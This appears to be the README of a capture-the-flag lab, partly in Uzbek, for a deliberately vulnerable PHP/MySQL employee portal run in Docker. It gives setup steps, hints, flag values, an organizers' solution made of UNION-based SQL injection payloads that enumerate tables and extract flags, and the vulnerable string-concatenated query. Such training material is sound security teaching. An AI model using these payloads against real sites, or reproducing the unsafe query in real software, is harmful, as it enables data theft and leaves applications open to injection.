# CTF Challenge: Employee Portal SQL Injection

## Challenge Description
Bu zamonaviy Employee Management Portal tizimida yashirin SQL injection zaifligi mavjud. Sizning vazifangiz - tizimda yashirilgan flagni topish va adminlar uchun maxfiy ma'lumotlarga kirish.

**Difficulty Level:** Intermediate  
**Category:** Web Exploitation - SQL Injection

## Setup Instructions

### 1. Requirements
- Docker
- Docker Compose

### 2. Build and Run
```bash
# Repository clone qiling
git clone <repository-url>
cd sql-injection-ctf

# Docker container'larni ishga tushiring
docker-compose up -d

# Ilovani browserda oching
http://localhost:8080
```

### 3. Challenge Environment
- **Web Application:** `http://localhost:8080`
- **Database:** MySQL 8.0 (port 3306)
- **Technologies:** PHP 8.1, Apache, Bootstrap 5

## Challenge Details

### Target
Tizimda 2 ta flag yashirilgan:
1. **Primary Flag:** `CTF{SQL_1nj3ct10n_M4st3r_2024}` - asosiy SQL injection orqali
2. **Bonus Flag:** `FLAG{Hidden_Admin_Access}` - qo'shimcha kengaytirilgan hujumlar uchun

### Features
- **Modern UI:** Bootstrap 5 bilan yaratilgan zamonaviy interfeys
- **Interactive Tables:** DataTables.js bilan interaktiv jadvallar
- **Multiple Tabs:** Dashboard, Employees, Projects, va Advanced Search
- **Hidden Vulnerability:** Search funksiyasida SQL injection zaifligi

### Vulnerability Location
SQL injection zaifligi **Advanced Search** tabida yashirilgan. Oddiy ko'rinishda, lekin to'g'ri payload bilan exploit qilish mumkin.

### Database Schema
```sql
- users (admin accounts)
- employees (employee information)  
- projects (project data)
- secrets (hidden flags)
```

## Hints for Participants

1. **Start Simple:** Oddiy search qilib ko'ring va qanday natijalar qaytishini kuzating
2. **Error Messages:** Ba'zi xatoliklar database strukturasi haqida ma'lumot berishi mumkin
3. **UNION Attacks:** Boshqa jadvallardan ma'lumot olish uchun UNION operatoridan foydalaning
4. **Information Schema:** MySQL ning information_schema database'idan foydalanib jadval nomlarini aniqlang
5. **Multiple Tables:** Bir nechta jadvallar mavjud, flaglar `secrets` jadvalida
6. **Advanced Techniques:** Time-based yoki blind SQL injection texnikalarini ham sinab ko'ring

## Solution Approach (Organizers Only)

### Basic Injection
```sql
' UNION SELECT 1,2,3,4,5,6,7,8 -- 
```

### Database Enumeration
```sql
' UNION SELECT 1,table_name,3,4,5,6,7,8 FROM information_schema.tables WHERE table_schema=database() -- 
```

### Column Discovery
```sql
' UNION SELECT 1,column_name,3,4,5,6,7,8 FROM information_schema.columns WHERE table_name='secrets' -- 
```

### Flag Extraction
```sql
' UNION SELECT 1,flag,description,4,5,6,7,8 FROM secrets -- 
```

## Scoring
- **Basic SQL Injection Detection:** 25 points
- **Database Structure Discovery:** 25 points  
- **Primary Flag Recovery:** 100 points
- **Bonus Flag Discovery:** 50 points
- **Advanced Techniques (Blind/Time-based):** 25 points

## Security Learning Objectives

### Participants will learn:
1. **SQL Injection Fundamentals:** Qanday qilib zaif parametrlarni aniqlash
2. **UNION-based Attacks:** Boshqa jadvallardan ma'lumot olish usullari
3. **Database Enumeration:** Information schema orqali database strukturasini o'rganish
4. **Payload Construction:** Turli xil SQL injection payload'larini yaratish
5. **Modern Web Security:** Zamonaviy web ilovalarida xavfsizlik zaifliklari

### Vulnerability Analysis
Bu challenge'da quyidagi xavfsizlik muammolari mavjud:

**Primary Vulnerability:**
```php
// Vulnerable code in index.php line 24-30
$sql = "SELECT e.*, p.project_name, p.budget 
        FROM employees e 
        LEFT JOIN projects p ON e.department = 'IT' AND p.status = 'active'
        WHERE e.first_name LIKE '%$search_query%' 
           OR e.last_name LIKE '%$search_query%' 
           OR e.department LIKE '%$search_query%'
        ORDER BY e.id";
```

**Why it's vulnerable:**
- To'g'ridan-to'g'ri string concatenation
- Hech qanday input validation yo'q
- Prepared statements ishlatilmagan

**Real-world Impact:**
- Ma'lumotlar bazasidagi barcha ma'lumotlarga ruxsatsiz kirish
- Maxfiy ma'lumotlarni o'g'irlash
- Database'ni o'zgartirish yoki yo'q qilish imkoniyati

## Deployment Notes

### For Event Organizers:

1. **Network Isolation:** Har bir team uchun alohida container instance yarating
2. **Monitoring:** Challenge progress'ini kuzatish uchun loglarni monitoring qiling
3. **Reset Capability:** Database'ni tez reset qilish uchun script tayyorlang

### Reset Database:
```bash
docker-compose down
docker-compose up -d
```

### Custom Configuration:
```bash
export WEBAPP_PORT=8081
docker-compose up -d

```

## Educational Resources

### Recommended Reading:
1. OWASP SQL Injection Prevention Cheat Sheet
2. PortSwigger Web Security Academy - SQL Injection
3. SANS SQL Injection Fundamentals

### Additional Practice:
- SQLi-labs
- DVWA (Damn Vulnerable Web Application)  
- bWAPP (Buggy Web Application)

## Technical Implementation Details

### Security Features (Intentionally Weak):
- **Error Handling:** Generic error messages (lekin ba'zan database errors ko'rinadi)
- **Input Validation:** Minimal validation
- **Database Permissions:** Web user'ga read-only access (realistic scenario)

### Challenge Complexity:
- **Beginner Level:** Basic UNION injection
- **Intermediate Level:** Database enumeration
- **Advanced Level:** Blind/Time-based techniques

### Database Design:
Database maxsus tarzda dizayn qilingan:
- Employee ma'lumotlari realistic
- Projects bilan complex JOIN'lar
- Hidden secrets table
- Multiple flag locations

## Troubleshooting

### Common Issues:
1. **Port Conflicts:** 8080 port busy bo'lsa, docker-compose.yml'da port'ni o'zgartiring
2. **Database Connection:** Container'lar to'liq ishga tushguncha bir necha sekund kuting
3. **Permission Issues:** Docker fayllariga write permission bor ekanligini tekshiring

### Debug Commands:
```bash
# Container logs ko'rish
docker-compose logs web
docker-compose logs db

# Database'ga to'g'ridan-to'g'ri ulanish
docker exec -it <container_name> mysql -u webapp -p employee_portal

# Web container ichiga kirish
docker exec -it <container_name> bash
```

## Author Information
**Created by:** Cybersecurity Team  
**Contact:** ctf-admin@company.com  
**Version:** 1.0  
**Last Updated:** June 2025

---

